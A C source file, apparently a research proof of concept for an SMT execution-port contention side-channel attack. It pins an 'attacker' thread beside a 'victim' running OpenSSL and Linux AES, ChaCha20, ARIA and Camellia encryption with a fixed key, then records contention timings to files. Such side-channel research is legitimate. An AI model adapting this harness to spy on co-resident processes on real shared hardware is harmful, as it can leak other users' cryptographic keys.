#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <pthread.h>
#include "libxom-aes-gcm.h"

#define countof(x) (sizeof(x)/sizeof(*(x)))

#define RUNS_PER_PORT  0x800
#define NUM_SAMPLES    600

#define NUM_BLOCKS      0x100

#define AES_MAX_KEYLENGTH	(15 * 16)
#define AES_MAX_KEYLENGTH_U32	(AES_MAX_KEYLENGTH / sizeof(uint32_t))

/*
 * Please ensure that the first two fields are 16-byte aligned
 * relative to the start of the structure, i.e., don't move them!
 */
struct crypto_aes_ctx {
	uint32_t key_enc[AES_MAX_KEYLENGTH_U32];
	uint32_t key_dec[AES_MAX_KEYLENGTH_U32];
	uint32_t key_length;
};

struct crypto_tfm;
struct aria_ctx;

extern uintptr_t aes_gctr_linear(void *icb, void* x, void *y, unsigned int num_blocks);
// linux
extern void chacha_init_arch(uint32_t *state, const uint32_t *key, const uint8_t *iv);
// linux
extern void chacha_crypt_arch(uint32_t *state, uint8_t *dst, const uint8_t *src, unsigned int bytes, int nrounds);
// linux
void aria_set_encrypt_key(struct aria_ctx *ctx, const uint8_t *in_key, unsigned int key_len);
// linux
void aria_ctr_encrypt(void *_ctx, uint8_t *out, const uint8_t *in, size_t _len, void* icb);
// linux
int camellia_setkey(struct crypto_tfm *tfm, const uint8_t *key, unsigned int key_len);
// linux
void camellia_ctr_encrypt(void *_ctx, uint8_t *out, const uint8_t *in, size_t _len, void* icb);

extern void contend_p0(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p1(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p5(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p06(unsigned long* out_buf, unsigned long num_entries);

volatile unsigned char* sync_page = NULL;

extern void openssl_aesni_ctr32_encrypt_blocks( const unsigned char *in,
                                        unsigned char *out,
                                        size_t blocks,
                                        const void *key, const unsigned char *ivec
                                        );
// openssl
void ChaCha20_ctr32(unsigned char *out, const unsigned char *inp,
                    size_t len, const unsigned int key[8],
                    const unsigned int counter[4]);

struct camellia_key_st;
#define CAMELLIA_KEY struct camellia_key_st
// Openssl
int Camellia_set_key(const unsigned char *userKey, const int bits,
                     CAMELLIA_KEY *key);
// Openssl
void Camellia_encrypt(const unsigned char *in, unsigned char *out,
                      const CAMELLIA_KEY *key);


struct aria_key_st;
#define ARIA_KEY struct aria_key_st
int ossl_aria_set_encrypt_key(const unsigned char *userKey, const int bits, ARIA_KEY *key);
void* ossl_aria_encrypt(const unsigned char *in, unsigned char *out, const ARIA_KEY *key);
void CRYPTO_cbc128_encrypt(const unsigned char *in, unsigned char *out,
                           size_t len, const void *key,
                           unsigned char ivec[16], void* block);

void CRYPTO_ctr128_encrypt(const unsigned char *in, unsigned char *out,
                           size_t len, const void *key,
                           unsigned char ivec[16],
                           unsigned char ecount_buf[16], unsigned int *num,
                           void* block);

extern void linux_aesni_ctr_enc(struct crypto_aes_ctx *ctx, uint8_t *out, const uint8_t *in, unsigned int len, uint8_t *iv);

static void set_processor_affinity(unsigned int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

static uint32_t get_sibling_cores(){
    const static size_t max_cpu_cores = 0x100;
    char *line = NULL;
    unsigned int corenum;
    int parsed, count = 0, i, j;
    size_t len = 0;
    FILE* info;
    uint8_t cpu_cores[max_cpu_cores];

    info = fopen( "/proc/cpuinfo", "r");
    if(!info)
        return 1 << 16;

    // Get amount of executable memory regions
    while (getline(&line, &len, info) > 0 && count < max_cpu_cores) {
        parsed = sscanf(line, "core id\t\t: %u", &corenum);
        free(line);
        line = NULL;
        if(parsed <= 0)
            continue;
        cpu_cores[count++] = (uint8_t) corenum;
    }

    fclose(info);

    for(i = count - 1; i >= 0; i--) {
        for(j = i - 1; j >= 0; j--) {
            if(cpu_cores[i] == cpu_cores[j])
                return (((uint32_t) i) << 16) | (uint32_t) j;
        }
    }

    return 1 << 16;
}

// The victim simply waits for the attacker to synchronize, and then starts the encryption
static void __attribute__((noreturn)) victim() {
    unsigned int i, num;
    unsigned char buf[16] = {0,};
    aes_uint128 icb = {.u64={0, 0}}, x[NUM_BLOCKS] = {{.u64={0, 0}},}, y[NUM_BLOCKS] = {{.u64={0, 0}},};
    aes_uint128 key = {.u64={0x1234567890abdef, 0xcafebabecafebabe}}, key2 = key;
    static uint8_t _camellia_key[280] = {0, };
    CAMELLIA_KEY* camellia_key = (CAMELLIA_KEY*) _camellia_key;
    static uint8_t _camelliactx[312] = {0, };
    struct crypto_tfm* camelliactx = (struct crypto_tfm*) _camelliactx;
    static uint8_t _aria_key[276] = {0, };
    ARIA_KEY * aria_key = (ARIA_KEY*) _aria_key;
    static uint8_t _ariactx[552];
    struct aria_ctx* ariactx = (struct aria_ctx*) _ariactx;
    uint32_t chacha_state;
    __attribute__((aligned(0x10))) static struct crypto_aes_ctx aes_ctx = {
            .key_length = sizeof(key)
    };
    memcpy(&aes_ctx.key_enc, &key, sizeof(key));
    memcpy(&aes_ctx.key_dec, &key, sizeof(key));

    chacha_init_arch(&chacha_state, (void*)&key, (void*)&icb);
    ossl_aria_set_encrypt_key((void*)&key, sizeof(key)*8, aria_key);
    aria_set_encrypt_key(ariactx, (void*)&key, sizeof(key));

    Camellia_set_key((void*)&key, sizeof(key)*8, camellia_key);
    camellia_setkey(camelliactx, (void*)&key, sizeof(key));

    *sync_page = 1;
    for(;;) {
        i = 1;
        num = 0;
        while (!*sync_page) { asm volatile("lfence");}
        while(i--) {
            asm volatile(".rept 512\nlfence\n.endr");
            //aes_gctr_linear(&icb, x, y, NUM_BLOCKS);
            openssl_aesni_ctr32_encrypt_blocks((void*)x, (void*)y, NUM_BLOCKS, &key, (void*)&icb);
            //linux_aesni_ctr_enc(&aes_ctx, (void *) y, (void *) x, sizeof(x), (void *) &icb);
            //chacha_crypt_arch(&chacha_state, (void *)y, (void *)x, sizeof(x), 20);
            //ChaCha20_ctr32((void*)y, (void*)x, sizeof(x), (void*)&key, (void*)&icb);
            //CRYPTO_ctr128_encrypt((void*)x, (void*)y, sizeof(x), aria_key, (void*)&icb, buf, &num, ossl_aria_encrypt);
            //aria_ctr_encrypt(ariactx, (void*)y, (void*)x, sizeof(x), &icb);
            //CRYPTO_ctr128_encrypt((void*)x, (void*)y, sizeof(x), camellia_key, (void*)&icb, buf, &num, Camellia_encrypt);
            //camellia_ctr_encrypt(camelliactx, (void*)y, (void*)x, sizeof(x), &icb);
            asm volatile(".rept 4096\nlfence\n.endr");
        }
        *sync_page = 0;
    }
}


static void attacker() {
    unsigned i, j;
    static uint64_t result_buffer[NUM_SAMPLES];
    const static struct {
        const char* out_path;
        void (*contention_method)(unsigned long*, unsigned long);
    } ports[] = {
            {"p0.bin", contend_p0},
            {"p1.bin", contend_p1},
            {"p5.bin", contend_p5},
            {"p06.bin", contend_p06},
    };
    FILE* files[countof(ports)];

    for(i = 0; i < countof(ports); i++)
        files[i] = fopen(ports[i].out_path, "w");

    // Make sure everything is cached on the victim's side
    for(i = 0; i < 5; i++){
        *sync_page = 1;
        while(*sync_page) {asm volatile("lfence");}
    }


    // Run the actual attack
    for(i = 0; i < countof(ports); i++) {
        for (j = 0; j < RUNS_PER_PORT; j++) {
            *sync_page = 1;
            ports[i].contention_method(result_buffer, countof(result_buffer));
            fwrite(result_buffer, sizeof(*result_buffer), countof(result_buffer), files[i]);
            while(*sync_page) {asm volatile("lfence");}
        }
        fclose(files[i]);
    }
    puts("Done");
}


int main() {
    static unsigned char plain[0x1000], cipher[0x1000];
    static aes_uint128 iv = {.u64 = { 0xcafebabecafebabe, 0xdeafbeefdeadbeef}};
    static aes_uint128 tag = {.u64 = { 0, 0}};

    uint32_t cores = get_sibling_cores();

    // Set up sync page
    sync_page = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *sync_page = 0;

    printf("Running on cores %u and %u!\n", cores & 0xff, cores >> 16);

    // Fork and pivot to SMT sibling cores
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        set_processor_affinity(cores >> 16);
        victim();
    }

    set_processor_affinity(cores & 0xff);
    attacker();

    return 0;
}